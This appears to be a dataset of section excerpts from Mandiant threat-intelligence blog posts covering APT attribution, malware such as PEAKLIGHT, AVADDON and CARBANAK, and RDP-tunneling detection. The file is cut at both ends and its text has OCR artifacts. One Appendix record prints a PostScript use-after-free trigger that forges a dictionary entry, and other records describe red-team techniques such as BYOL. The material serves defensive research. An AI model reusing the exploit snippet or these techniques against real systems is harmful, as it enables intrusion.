funds for other North Korean state priorities. ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant assesses with high confidence that APT45 is a state-sponsored cyber operator conducting threat activity in support of the North Korean regime. We assess with moderate confidence that \nAPT45 is attributable specifically to North Korea's Reconnaissance General Bureau (RGB). \nActivity attributed to APT45 by Mandiant has been publicly reported as \"Andariel\", \"Onyx Sleet\", \"Stonefly\", and \"Silent Chollima\". The group's activity is also frequently reported as linked to \"Lazarus Group\". ", "source": "mandiant"}, {"title": "Conclusion", "content": "Mandiant observed a clear evolution of the TTPs from the early stages of the campaign to its current form. \nStarting off with the initial payload served in explorer.ps1, where a custom decoding scheme was developed to the point where it got replaced with asymmetric encryption and the addition of the capability to track infected devices. \nFurthermore, the analysis of both EMPTYSPACE and QUIETBOARD suggests how the threat actors took a modular approach in developing their toolset. QUIETBOARD started by only having one module and then more functionality was incrementally added. Similarly, the Python variant of EMPTYSPACE shows clear signs of versioning. The use of multiple programming languages to create different versions of the EMPTYSPACE downloader and the URL change when the Vimeo video was taken down show a predisposition for experimentation and adaptability on the threat actors' side. ", "source": "mandiant"}, {"title": "Conclusion", "content": "POSHSPY is an excellent example of the skill and craftiness of APT29. By \"living off the land\" they were able to make an extremely discrete backdoor that they can deploy alongside their more conventional and noisier backdoor families, in order to help ensure persistence even after remediation. As stealthy as POSHSPY can be, it comes to light quickly if you know where to look. Enabling and \nmonitoring enhanced PowerShell logging can capture malicious code as it executes and legitimate WMI persistence is so rare that malicious persistence quickly stands out when enumerating it across an environment. This is one of several sneaky backdoor families that we have identified, including an off-the-shelf domain fronting backdoor and HAMMERTOSS. When responding to an APT29 breach, it is vital to increase visibility, fully scope the incident before responding and thoroughly analyze accessed systems that don't contain known malware. ", "source": "mandiant"}, {"title": "Conclusion", "content": "PEAKLIGHT is an obfuscated PowerShell-based downloader that is part of a multi-stage execution chain that checks for the presence of ZIP archives in hard-coded file paths. If the archives do not exist, the downloader will reach out to a CDN site and download the remotely hosted archive file and save it to disk. PEAKLIGHT was observed downloading payloads such as LUMMAC.V2, SHADOWADDER, and CRYPTBOT. The malware developers used several different obfuscation and evasion techniques, including system binary proxy execution and CDN abuse. Mandiant identified different variations of the PEAKLIGHT downloader, each with its own unique characteristics. \nWe encourage security researchers to remain vigilant and share any insights or similar malware samples they encounter. By working together and fostering open communication within the cybersecurity community, we can better understand the evolving threat landscape and strengthen our collective defenses against future attacks. \nProtect and scan your environment against the indicators of compromise and YARA rules in the following section. If you suspect that your environment may have been compromised, contact our Incident Response team for assistance. ", "source": "mandiant"}, {"title": "Summary", "content": "The implant consists of a modified Cisco IOS image that allows the attacker to load different functional modules from the anonymity of the internet. The implant also provides unrestricted access using a secret backdoor password. Each of the modules are enabled via the HTTP protocol (not HTTPS), using a specifically crafted TCP packets sent to the routers interface. The packets have a nonstandard sequence and corresponding acknowledgment \nnumbers. The modules can manifest themselves as independent executable code or hooks within the routers IOS that provide functionality similar to the backdoor password. The backdoor password provides access to the router through the console and Telnet. ", "source": "mandiant"}, {"title": "Conclusion", "content": "We hope that this post has advanced the understanding of this flexible and stealthy router implant. It should be evident now that this attack vector is very much a reality and will most likely grow in popularity and prevalence. In the next part of this series, we will examine methods that can be used to passively and actively detect this implant. \nThe following blog entry shows how to produce a Cisco IOS core dump:   \nhttp://blogs.cisco.com/security/offline-analysis-ofios-image-integrity ", "source": "mandiant"}, {"title": "Conclusion", "content": "We covered a wide variety of topics in this two-part series, including: \nPhysical device inspection   \nIdentifying and exploring physical debugging interfaces (UART) Chip-off techniques to remove the NAND storage \nShining a Light on SolarCity: Practical Exploitation of the X2e IoT Device (Part Two) | Mandiant | Google Cloud Blog \nBinary analysis of the filesystems and bootloader configurations Power glitch attacks against the U-Boot bootloader Linux user space privilege escalation \nWe hope that readers were able to learn from our experiences with the X2e and will be inspired to use these techniques in their own analysis. Finally, Mandiant would like to thank both Tesla/SolarCity and Digi International for their efforts to remediate these vulnerabilities and for their cooperation with releasing this blog series. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Determining the activity of targeted threat actors is difficult. Most of the activity associated with publicly available RATs is traditional cybercrime associated with spam runs, banking Trojans and malware distribution. However, useful indicators can be extracted from these ubiquitous RATs to track the activities of targeted threat actors (as well as cybercrime). \nTools \nXtreme RAT ", "source": "mandiant"}, {"title": "Conclusion", "content": "The similarities between these ransomware families and the timespan of activity suggest that the MEDUSALOCKER code base was likely reused by different threat actors that started operating RaaS in 2020. The binary similarities and techniques used show a certain degree of relationship between them. However, the technical skills of each threat actor involved in the development of these RaaS and the implementations vary per ransomware. \nAVADDON constitutes a considerable evolution compared to MEDUSALOCKER, however, it is unclear whether AVADDON was the successor of MEDUSALOCKER due to technical differences and overlap in their activity. The AVADDON service was operational for about a year and gained considerable popularity among threat actors to extort victims across multiple regions and industries until events forced a fast exit followed by the shutdown of its operations and the release of the victim's private keys. \nGiven the similarities suggesting code overlap between these ransomware families, the different skillsets of the involved operators and the overlap in time, it is unclear whether the Law Enforcement disruption of ransomware operations at this time will be definitive for the threat actors responsible for AVADDON. \nRebranding, code sharing, or the purchase of   \nsource code by different threat actors are practical   \npossibilities to get back into extortion operations as   \nseen in previous cases such as   \nSODINOKIBI's connections with \nOne Source to Rule Them All: Chasing AVADDON Ransomware | Mandiant | Google Cloud Blog GANDCRAB ransomware, or the rebuild and rebrand of a new ransomware using another's code base such as BLACKMATTER. ", "source": "mandiant"}, {"title": "Appendix", "content": "AVADDON \nAVADDON is ransomware written in $\\mathsf{C}\\substack{++}$ that encrypts files stored locally and on mapped network shares. AVADDON terminates targeted processes and services prior to encrypting files. AVADDON uses the AES-256 encryption algorithm to encrypt files. AVADDON is a Windows ransomware written in $\\mathsf{C}\\substack{++}$ . It is run as an affiliate program, RaaS. System files are encrypted using a single AES-256 key. The AES-256 key is generated at run-time and encrypted using an embedded RSA public key. The malware also has anti-analysis techniques and check that it is not running in a system with Russian language. ", "source": "mandiant"}, {"title": "Conclusion", "content": "flare-emu is a flexible tool to include in your arsenal that can be applied to a variety of code analysis problems. Several example problems were presented and solved using it in this blog post, but this is just a glimpse of its possible applications. If you haven't given emulation a try for solving your \ncode analysis problems, we hope you will now consider it an option. And for all, we hope you find value in using these new tools! \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "The new capa release supports sandbox-based dynamic analysis of programs \u2013 currently using the CAPE sandbox. This allows the tool to better analyze packed, obfuscated, and very complex samples with potential performance and accuracy improvements. By extracting and abstracting thousands of data points capa can speed up sandbox-based malware triage significantly. We hope you leverage the new possibilities and look forward to hearing your feedback and ideas. \nYou can find capa's source code on our GitHub page. To get started, download the standalone binaries for Windows, Linux, and Mac from our Releases page. Alternatively, use pip to install the tool from PyPI using pip install flare-capa. For more details please visit our installation page. \nTo use capa, you can directly run it against either an executable, shellcode, or a CAPE sandbox report. The tool automatically detects the sample's format and performs the required analysis. For more details on using CAPE and capa please see the download and usage page on our GitHub page. \nPosted in Threat Intelligence ", "source": "mandiant"}, {"title": "Conclusion", "content": "In analyzing BLACKMATTER we found that the author accomplishes RSA encryption with only three freestanding functions with no external libraries. The RSA public key does not stand out as it is simply a 1024-bit integer in the binary. There are no magic numbers-not even 65537-because of how the code is structured; the number 65537 is implicit in performing the sixteen squarings followed by one final multiplication by $m;$ it is possible the author used inline assembly within the three routines. We hope the reader will find these observations useful in spotting RSA implementations in other malware. We also found an insightful reminder in that instead of obscuring the meaning of code through obfuscation and packing, an attacker can also hide it in plain sight by creating freestanding and minimalistic implementations of cryptographic algorithms with no external dependencies. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Overview", "content": "Before diving into the details, we'll discuss the ConnectPort X2e device (referred to as X2e device throughout the post) at a high level. The X2e device is a programmable gateway that connects to and collects data from ZigBee devices. It is commonly used as a Smart Energy gateway to interpret and send energy readings from a residential Solar Inverter. Vendors will often purchase an X2e device and configure it to read power consumption \ngenerated by a customer's Solar Inverter. Figure 1 outlines a typical residential solar installation and highlights the X2e's role. \nFor our research, we focused on the X2e device used by SolarCity, now Tesla, to retrieve data from residential solar installations. A typical setup would involve SolarCity providing a customer with a gateway that would be connected to the Internet via an Ethernet cable on the customer's home network. Figure 2 shows one of the SolarCity branded X2e devices that we tested. \nWithout even plugging in the X2e device, we know of at least two separate interfaces to explore: the Ethernet interface and the ZigBee radio. Note that we did not review the ZigBee interface between the X2e and a solar invertor, and that interface will not be covered in either Part One or Part Two of this series. ", "source": "mandiant"}, {"title": "Overview", "content": "Before we talk about acquiring the firmware from the NAND chip, it's important to first understand the various scenarios that embedded devices typically follow. \nNAND verses NOR: These fundamentally different technologies each have their own benefits and drawbacks. NAND is cheap but suffers from high probability of \"bad blocks,\" or areas that are corrupt sometimes directly from the factory. As such, protections and considerations need to be present to be able to protect against this. NAND is also much faster to erase and write, making it ideal for storing file systems, kernels, and other pieces of code that may need to be reset or changed. NOR has significantly faster read times but is not as flexible with accessing data and has low erase and write speeds. NOR is usually used for low-level bootloaders, hardcoded firmware blobs, and other areas that are not expected to change frequently. The X2e uses a NAND flash. \nSerial verses Parallel: This refers to how the data is accessed and is typically visually identifiable. If there are a large number of pins, the flash is likely parallel. Serial NOR chips can be small in size and typically need eight or fewer pins to function. Common serial interfaces are Serial Peripheral Interface (SPI) or Inter-Integrated Circuit (I2C), while a common parallel interface for NAND is Open NAND Flash Interface (ONFI2.0, ONFI3.0). The X2e is a parallel flash. \nIC Form Factor: Another visually identifiable trait- form factor (or \"package\")-refers to how the chip is attached to the PCB. There is a long list of options, but common surface-mount flash packages include small outline package (SOP), thin outline small package (TOSP), or a variant of ball grid array (\\*BGA). The key distinction here is SOP and TOSP expose the pins, while BGA conceals the pins under the package. The X2e is BGA63, also referred to as a 63-pin BGA package. \nManaged verses Unmanaged Flash: This one is more applicable to NAND, for reasons alluded to in the NAND verses NOR section. As stated, NAND needs help to manage the integrity of the data. With unmanaged NAND, the IC reserves sections of the flash (often called \"spare\" area) for someone else to manage the data. This is typically implemented as either a kernel driver or an external NAND controller. Managed NAND means that the IC package includes the controller and transparently manages the data. This is extremely common in embedded devices, as either embedded MMC (eMMC) or universal flash storage (UFS). The X2e uses unmanaged flash and is controlled by the main microcontroller present on the PCB. \nWith the basics out of the way, we proceeded with physically removing the chip from the PCB. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In Part One of this two-part blog series, we covered an overview of the X2e, our initial network-based reconnaissance, PCB inspection techniques, physical debugging interface probing, chip-off techniques, and firmware analysis. Using these methodologies, we were successfully able to \n2025/5/7 11:12 \nremotely compromise the X2e device as a nonadministrative user due to hardcoded credentials (CVE-2020-9306). In Part Two, we will re-investigate physical attacks against the X2e in the form of glitch attacks, re-explore the U-Boot bootloader, and finally demonstrate an attack to remotely compromise the X2e device as a privileged user. \nTo continue reading, check out Part Two now. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant has begun tracking this activity as UNC3886. Given the highly targeted and evasive nature of this intrusion, we suspect UNC3886 motivation to be cyber espionage related. Additionally, we assess with low confidence that UNC3886 has a China-nexus. Each investigation conducted by Mandiant includes analysts from our Advanced Practices team who work to correlate activity observed in the thousands of investigations to which Mandiant responds. At times, we do not have the data available to directly attribute intrusion activity to a previously known group. In these cases, we create a new UNC group to track the activity that we observed. An UNC group is a cluster of related cyber intrusion activity, which includes observable artifacts such as adversary infrastructure, tools, and tradecraft, that we are not yet ready to give a classification such as APT or FIN. For more details on how Mandiant uses UNC groups, see our blog post: DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors. ", "source": "mandiant"}, {"title": "Conclusion", "content": "While we noted the technique used by UNC3886 requires a deeper level of understanding of the ESXi operating system and VMWare's virtualization platform, we anticipate a variety of other threat actors will use the information outlined in this research to begin building out similar capabilities. Mandiant recommends organizations using ESXi and the VMware infrastructure suite follow the hardening steps outlined in this blog post to minimize the attack surface of ESXi hosts. ", "source": "mandiant"}, {"title": "Overview", "content": "The RGB is the North Korea's primary foreign intelligence service, responsible for intelligence collection and clandestine operations. It is believed to be comprised of six bureaus: \n$\\uparrow^{\\mathsf{s t}}$ Bureau: Operations $2^{\\mathsf{n d}}$ Bureau: Reconnaissance $3^{\\mathsf{r d}}$ Bureau: Foreign Intelligence $5^{\\dag\\vert\\mathfrak{h}}$ Bureau: Inter-Korean Affairs 6th Bureau: Technology 7th Bureau: Support \nNotably, a $4^{t h}$ bureau does not exist likely because the number $\"4\"$ is considered taboo. \nWhile cyber efforts are a portion of the organization's overall operations, the $3^{\\mathsf{r d}}$ Bureau (Foreign Intelligence) and $5^{\\dag\\vert\\mathfrak{h}}$ Bureau (Inter-Korean Affairs) appear to hold the \"meat and potatoes\" of North Korea's cyber program. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The country's espionage operations are believed to be reflective of the regime's immediate concerns and priorities, which is likely currently focused on acquiring financial resources through crypto heists, targeting of media, news, and political entities, \ninformation on foreign relations and nuclear information, and a slight decline in the once spiked stealing of COVID-19 vaccine research. Information collected in these campaigns will possibly be used to develop or produce internal items and strategies, as in vaccines, mitigations to bypass sanctions, funding for the country's weapons programs, and so on. Additional information continues to be collected to determine the extent to which these groups operate and streamline their operations. Being able to see though the intentional fog left by North Korean leadership, and able to identify targeting patterns that align to physical units allows for a proactive defense against these cyber operators. This effort is critical in a country where little is known to the outside world and defector reporting supplemented with cyber operations can help. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Attribution", "content": "Attribution presents plenty of difficult decisions and complex tradeoffs. But, attributing cyber activity should always be seen as an enabler rather than a straitjacket. \nAttribution trade-offs can pose awkward questions for a security function, yet the answer is usually obvious when we simply ask: what is best for our organization? That is because the attribution process thrives when it is linked to clear organizational requirements, use cases, and outcomes. This might not be quite as glamorous as trying to replicate government intelligence agencies, but it will be a whole lot more effective for your organization and stakeholders. ", "source": "mandiant"}, {"title": "Appendix", "content": "$\\%$ Create dict2 and fill it with   \n$\\%$ several key-value pairs   \n/dict2 5 dict def   \ndict2 begin   \n/k1 1000 array def   \n/k2 1000 array def   \ndict2 end   \n$\\%$ Create dict1 and fill it with   \n$\\%$ one key-value pair under k1   \n/dict1 3 dict def   \ndict1 begin   \n/k1 1000 array def   \ndict1 end \nThe EPS Awakens | Mandiant | Google Cloud Blog $\\%$ Begin forall enumeration on dict2 dict2 { $\\%$ Destroy dict2's internal hash-table, $\\%$ freeing all key-value pairs dict1 dict2 copy $\\%$ Create a new string to overwrite the $\\%$ freed key-value pair k2. $\\%$ The string contains a forged key-value pair 44 string 0 <00000000ff03000000050000000000000000 00002000e013030000000000000000000000 44444444> putinterval $\\%$ Next iteration of the loop uses stale. $\\%$ ptrNext, which points into the above string, $\\%$ and reads a forged key-pair } forall \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Background", "content": "In June 2021, Mandiant Consulting was engaged to respond to an intrusion. During analysis, Mandiant determined the initial vector was a trojanized security camera PVR installer from a legitimate website. Mandiant attributed the overall intrusion activity to DARKSIDE affiliate UNC2465 due to continued use of infrastructure and tooling since October 2020. \nOn May 18, 2021, a user in the affected organization browsed to the Trojanized link and downloaded the ZIP. Upon installing the software, a chain of downloads and scripts were executed, leading to SMOKEDHAM and later NGROK on the victim's computer. Additional malware use such as BEACON, and lateral movement also occurred. Mandiant believes the Trojanized software was available from May 18, 2021, through June 8, 2021. \nPivoting on the slightly modified, but benign, MSHTA.exe application in VirusTotal, Mandiant identified a second installer package with the MD5 hash, e9ed774517e129a170cdb856bd13e7e8 (SVStation_Win64-B1130.1.0.0.exe), from May 26, \nSmoking Out a DARKSIDE Affiliate's Supply Chain Software Compromise | Google Cloud Blog 2021, which also connects out the same URL as the Trojanized SmartPSS installer. ", "source": "mandiant"}, {"title": "Conclusion", "content": "UNC2465 established initial access via a Trojanized installer executed by an unsuspecting user. UNC2465 interactively established an NGROK tunnel and began moving laterally in less than 24 hours. Five days later, UNC2465 returned and deployed additional tools such as a keylogger, Cobalt Strike BEACON, and conducted credential harvesting via dumping LSASS memory. \nRansomware groups continue to adapt and pursue opportunistic access to victims. UNC2465's move from drive-by attacks on website visitors or phishing \nSmoking Out a DARKSIDE Affiliate's Supply Chain Software Compromise | Goo emails to this software supply chain attack shows a concerning shift that presents new challenges for detection. While many organizations are now focusing more on perimeter defenses and twofactor authentication after recent public examples of password reuse or VPN appliance exploitation, monitoring on endpoints is often overlooked or left to traditional antivirus. A well-rounded security program is essential to mitigate risk from sophisticated groups such as UNC2465 as they continue to adapt to a changing security landscape. ", "source": "mandiant"}, {"title": "Prevention", "content": "If RDP is enabled, threat actors have a way to move laterally and maintain presence in the environment through tunneling or port forwarding. To mitigate vulnerability to and detect these types of RDP attacks, organizations should focus on both hostbased and network-based prevention and detection mechanisms. For additional information see the FireEye blog post on establishing a baseline for remote desktop protocol. ", "source": "mandiant"}, {"title": "Prevention", "content": "Remote Desktop Service: Disable the remote desktop service on all end-user workstations and systems for which the service is not required for remote connectivity. \nHost-based Firewalls: Enable host-based firewall rules that explicitly deny inbound RDP connections.   \nLocal Accounts: Prevent the use of RDP using local accounts on workstations by enabling the \"Deny log on through Remote Desktop Services\" security setting. \nHost-Based Detection: \nRegistry Keys: \nReview registry keys associated with Plink connections that can be abused by RDP session tunneling to identify unique source and destination systems. By default, both PuTTY and Plink store session information and previously connected ssh servers in the following registry keys on Windows systems: \nHKEY_CURRENT_USER\\Software\\SimonTatha m\\PuTTY HKEY_CURRENT_USER\\SoftWare\\SimonTatha m\\PuTTY\\SshHostKeys   \nSimilarly, the creation of a PortProxy configuration with netsh is stored with the following Windows registry key: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentCo ntrolSet\\Services\\PortProxy\\v4tov4   \nCollecting and reviewing these registry keys can identify both legitimate SSH and unexpected tunneling activity. Additional review may be needed to confirm the purpose of each artifact. \nEvent Logs: \nReview event logs for high-fidelity logon events. Common RDP logon events are contained in the following event logs on Windows systems: %systemroot%\\Windows\\System32\\winevt\\L ogs\\Microsoft-TerminalServicesLocalSessionmanager%3Operational.evtx %systemroot%\\Windows\\System32\\winevt\\L ogs\\Security.evtx   \nThe \"TerminalServices-LocalSessionManager\" log contains successful interactive local or remote logon events as identified by EID 21 and successful reconnection of a previously established RDP session not terminated by a proper user logout as identified by EID 25. The \"Security\" log contains successful Type 10 remote interactive logons (RDP) as identified by EID 4624. A source IP address recorded as a localhost IP address (127.0.0.1 \u2013 127.255.255.255) may be indicative of a tunneled logon routed from a listening localhost port to the localhost's RDP port TCP 3389. \nReview your artifacts of execution for \"plink.exe\" file execution. Note that attackers can rename the file name to avoid detection. Relevant artifacts include, but are not limited to: \nApplication Compatibility Cache/Shimcache   \nAmcache   \nJump Lists   \nPrefetch   \nService Events   \nCCM Recently Used Apps from the WMI   \nrepository   \nRegistry keys \nNetwork-Based Prevention: \nRemote Connectivity: Where RDP is required for connectivity, enforce the connection to be initiated from a designated jump box or centralized management server.   \nDomain Accounts: Employ the \"Deny log on through Remote Desktop Services\" security setting for privileged accounts (e.g. domain administrators) and service accounts, as these types of accounts are commonly used by threat actors to laterally move to sensitive systems in an environment. \nNetwork-Based Detection: \nFirewall Rules: Review existing firewall rules to identify areas of vulnerability to port forwarding. In addition to the potential use of port forwarding, monitoring for internal communications between workstations in the environment should be conducted. Generally, workstations do not have a need to communicate with one another directly and Firewall rules can be used to prevent any such communication, except where needed. Network Traffic: Perform content inspection of network traffic. Not all traffic communicating on a given port is what it appears to be. For example, threat actors may use TCP ports 80 or \n443 to establish an RDP tunnel with a remote server. Deep inspection of the network traffic can likely reveal that it is not actually HTTP or HTTPS, but entirely different traffic all together. Therefore, organizations should closely monitor their network traffic. ", "source": "mandiant"}, {"title": "Conclusion", "content": "RDP enables IT environments to offer freedom and interoperability to users. But with more and more threat actors using RDP to move laterally across networks with limited segmentation, security teams are being challenged to decipher between legitimate and malicious RDP traffic. Therefore, adequate host-based and network-based prevention and detection methods should be taken \nBypassing Network Restrictions Through RDP Tunneling | Mandiant | Google Cloud Blog to actively monitor for and be able to identify malicious RDP usage. \nPosted in Threat Intelligence ", "source": "mandiant"}, {"title": "Prevention", "content": "This type of attack is difficult to defend against, because valuable information can be stolen, even if an attacker is never able to get direct access to your \nGlobal DNS Hijacking Campaign: DNS Record Manipulation at Scale | Mandiant | Google Cloud Blog organization's network. Some steps to harden your organization include: \n1. Implement multi-factor authentication on your domain's administration portal.   \n2. Validate A and NS record changes.   \n3. Search for SSL certificates related to your domain and revoke any malicious certificates.   \n4. Validate the source IPs in OWA/Exchange logs.   \n5. Conduct an internal investigation to assess if attackers gained access to your environment. ", "source": "mandiant"}, {"title": "Conclusion", "content": "This DNS hijacking, and the scale at which it has been exploited, showcases the continuing evolution in tactics from Iran-based actors. This is an overview of one set of TTPs that we recently observed affecting multiple entities. We are highlighting it now so that potential targets can take appropriate defensive action. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Attackers (and especially phishers) are always on the hunt for new ways to evade detection by security products. Obfuscation gives the attackers an edge, and makes it harder for security vendors to protect their customers. \nBy using instant messaging applications, attackers get user data in real time and victims have little to respond once their personal information is compromised. ", "source": "mandiant"}, {"title": "Background", "content": "The great folks at SpecterOps released a blog post earlier this year on browser isolation and how penetration testers and red team operators may work around browser isolation scenarios for ingress tool transfer, egress data transfer, and general bypass techniques. In summary, browser isolation protects users from web-based attacks by sandboxing the web browser in a secure environment (either local or remote) and streaming the visual content back to the user's local browser. The experience is (ideally) fully transparent to the end user. According to most documentation, three types of browser isolation exist: \n1. Remote browser isolation (RBI), the most secure and the most common variant, sandboxes the browser in a cloud-based environment.   \n2. On-premises browser isolation is similar to RBI but runs the sandboxed browser on-premises. The advantage of this approach is that on\n(QR) Coding My Way Out of Here: C2 in Browser Isolation Environments | Google Cloud Bl premises web-based applications can be accessed without requiring complex cloud-toon-premises connectivity. \n3. Local browser isolation, or client-side browser isolation, runs the sandboxed browser in a local containerized or virtual machine environment ( e.g., Docker or Windows Sandbox). \nThe remote browser handles everything from page rendering to executing JavaScript. Only the visual appearance of the web page is sent back to the user's local browser (a stream of pixels). Keypresses and clicks in the local browser are forwarded to the remote browser, allowing the user to interact with the web application. Organizations often use proxies to ensure all web traffic is served through the browser isolation technology, thereby limiting egress network traffic and restricting an attacker's ability to bypass the browser isolation. \nSpecterOps detailed some of the challenges that offensive security professionals face when operating in browser isolation environments. They document possible approaches on how to circumvent browser isolation by abusing misconfigurations, such as using HTTP headers, cookies, or authentication parameters to bypass the isolation features. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post, Mandiant demonstrated a novel technique to establish C2 when faced with browser https://cloud.google.com/blog/topics/threat-intelligence/c2-browser-isolation-environments \n(QR) Coding My Way Out of Here: C2 in Browser Isolation Environments | Google Cloud Blog isolation. While this technique proves that browser isolation technologies have weaknesses, Mandiant still recommends browser isolation as a strong protection measure against other types of attacks (e.g., client-side browser exploitation, phishing, etc). Organizations should not solely rely on browser isolation to protect themselves from web-based threats, but rather embrace the \"defense in depth\" strategy and establish a well-rounded cyber defense posture. Mandiant recommends the following controls: \n1. Monitor for anomalous network traffic: Even when using browser isolation, organizations should inspect network traffic and monitor for anomalous usage. The C2 method described in this post is low-bandwidth, hence transferring even small datasets will require many HTTP requests. ", "source": "mandiant"}, {"title": "Background", "content": "At DerbyCon last year, I had the pleasure of meeting Raphael Mudge, the developer behind the Cobalt Strike Remote Access Tool (RAT). During our discussion, I mentioned how useful it would be to be able to load .NET assemblies into Cobalt Strike beacons, similar to how PowerShell scripts can be imported using the \"powershell-import\" command. During a previous Red Team engagement I had been \nBring Your Own Land (BYOL) - A Novel Red Teaming Technique | Mandiant | Goo involved in, the use of PowerShell was precluded by the Endpoint Detection and Response (EDR) agent present on host machines within the target environment. This was a significant issue, as much of my red teaming methodology at the time was based on the use of various PowerShell scripts. For example, the \"Get-NetUser\" cmdlet of the PowerView script allows for the enumeration of domain users within an Active Directory environment. While the use of PowerShell was not an option, I found that no application-based whitelisting was occurring on hosts within the target's environment. Therefore, I started converting the PowerShell functionality into C# code, compiling assemblies locally as Portable Executable (PE) files, and then uploading the PE files onto target machines and executing them. This tactic was successful, and I was able to use these custom assemblies to elevate privileges up to Domain Admin within the target environment. \nRaphael agreed that the ability to load these assemblies in-memory using a Cobalt Strike beacon would be useful, and about 8 months later this functionality was incorporated into Cobalt Strike version 3.11 via the \"execute-assembly\" command. ", "source": "mandiant"}, {"title": "Conclusion", "content": "BYOL presents a powerful new technique for red teamers to remain undetected during their engagements, and can easily be used with Cobalt Strike's \"execute-assembly\" command. In addition, the use of C# assemblies can offer attackers more flexibility than similar PowerShell scripts can afford. Detections for CLR-based techniques, such as hooking of functions used to reflectively load assemblies, should be incorporated into defensive methodology, as these attacks are likely to become more prevalent as detections for LotL techniques mature. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Our analysis of this source code dump confirmed it was CARBANAK and turned up a few new and interesting data points. We were able to notify vendors about disclosures that specifically targeted their security suites. The previously documented NBIs, Windows API function resolution, backdoor command hash values, usage of Windows cabinet file APIs, and other artifacts associated with CARBANAK all match, and as they say, if the shoe fits, wear it. Interestingly though, the project itself isn't called CARBANAK or even Anunak as the information security community has come to call it based on the string artifacts found within the malware. The authors mainly refer to the malware as \"bot\" in the Visual Studio project, filenames, source \nCARBANAK Week Part Two: Continuing the CARBANAK Source Code Analysis | Google Cloud Blog code comments, output binaries, user interfaces, and manuals. \nThe breadth and depth of this analysis was a departure from the usual requests we receive on the FLARE team. The journey included learning some Russian, searching through a hundred thousand of lines of code for new information, and analyzing a few dozen binaries. In the end, I'm thankful I had the opportunity to take this request. \nIn the next post, Tom Bennett takes the reins to provide a retrospective on his and Barry Vengerik's previous analysis in light of the source code. Part Four of CARBANAK Week is available as well. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Malvertising and exploit kits continue to be a significant threat to regular users. While we strongly recommend using ad blockers for all web browsers, we understand that it's not always possible. For that reason, the best approach is to always keep your web browsers and applications fully updated. Also, regularly check your browser to see what plugins are being used and disable them if they are not necessary. \nIn all of the examples we discussed, FireEye customers were protected from infection by our multi-flow and multi-vector detection engine. \nUpdate (March 17, 2017): We would like to thank PopCash, Adcash, Propeller Ads, AlpNames Limited and Cloudflare for closing down rogue accounts linked to shadow servers that were discussed in this blog. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Targeting", "content": "The red team began this phase by querying Active Directory data for hostnames related to the objectives and found multiple servers and databases that included references to their key financial application. The red team reviewed the files and documentation on financial application web servers and found an authentication og indicating the following users accessed the financial application: \nCUSTOMER\\user1   \nCUSTOMER\\user2   \nCUSTOMER\\user3   \nCUSTOMER\\user4 \nThe red team navigated to the financial application's web interface (Figure 4) and found that \nFinding Weaknesses Before the Attackers Do | Mandiant | Google Cloud Blog authentication required an \"RSA passcode,\" clearly indicating access required an MFA token. ", "source": "mandiant"}, {"title": "Conclusion", "content": "As demonstrated in this case study, the Mandiant red team was able to gain a foothold in the client's environment, obtain full administrative control of the company domain and compromise all critical business applications without any software or operating system exploits. Instead, the red team focused on identifying system misconfigurations, conducting social engineering attacks and using the client's internal tools and documentation. The red team was able to achieve their objectives due to the configuration of the client's MFA, service account password policy and account segmentation. ", "source": "mandiant"}, {"title": "Challenges and Considerations", "content": "In comparison with safeguarding other types of infrastructure or potential targets, election administrators and security practitioners face some unique challenges. It is important to emphasize that not all these threats represent an equal risk in impact to the electoral process. \nEvent-specific activity: The reasons why a certain actor might target an election might vary from one event to another. In observance of election-related IO activity, presidential and general elections seem to be targeted at higher volume than midterms, based on the limited sample size of Mandiant and public third-party reporting. However, this assessment may be influenced by attention bias; it is likely that more defenders spend more time hunting for activity surrounding presidential and general elections than regional, local, or midterm elections. \nAssessing intent: One challenge in assessing risk from threat actors targeting elections is that the targeting of certain entities (such as state infrastructure) could be for purposes other than election-related threat activity; simultaneously \nCyber Threats to the 2022 Midterm Elections | What to Expect | Googl though, a foothold in such infrastructure could also be leveraged in the future for electioncentric activity. Visibility into specific data or victims targeted, as well as historical missions' taskings attributed to a specific group may provide additional insight into adversary motivations. \nCommunication of threats: As trust in the electoral process is essential, communication of the details of an ongoing incident that may occur during an election-with stakeholders being the broader public-increases the complexity of response. Timely communication of what targets were impacted and in what manner becomes an important component in ensuring trust in the process that election administrators must navigate. \nA historical understanding of threats to election participants and infrastructure-and global visibility into current operations by threat actors that have demonstrated an interest in targeting elections-can prove valuable for security teams to scope, prioritize, and anticipate future threat emergence. Threat intelligence that informs and provides visibility into the recent tools, tactics, and procedures of such threat actors in other operations can better arm election defenders. Organizations can operationalize such insights to proactively harden networks and potential targets to better prepare for threats to this critical democratic process. \nHead over to our election security page for more on how Mandiant is helping to secure elections. ", "source": "mandiant"}, {"title": "Summary", "content": "The China-nexus threat actor activity detailed above expanded to multiple customers, and eventually escalated to a Managed Defense Community Protection Event (CPE). CPEs are rapidly progressing campaigns targeting multiple customers with substantial potential for business impact. Managed Defense customers are immediately notified of CPE activity, indicators are deployed to monitor customer products, and the Managed Defense Consulting team provides insight on how to mitigate risk. \n2025/5/7 11:21 \nRegardless of the scale of your investigation, time is of the essence. Drowning under investigative data without a clear line of questioning buys attackers additional time to impose their agenda on your organization. Remember, products and intelligence are components of your security practice, but expertise is required in order to transform those inputs into an effective response. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The attestation signing process offloads the responsibility of verifying the identity of the requesting hardware or software vendor to the Certificate Authorities.  In theory this is a valid process as the CAs must follow agreed upon procedures to verify the identity of the requesting entity and the authority of the individual making the request to represent the software vendor. However, this process is being abused to obtain malware signed by Microsoft. \nThis is not a 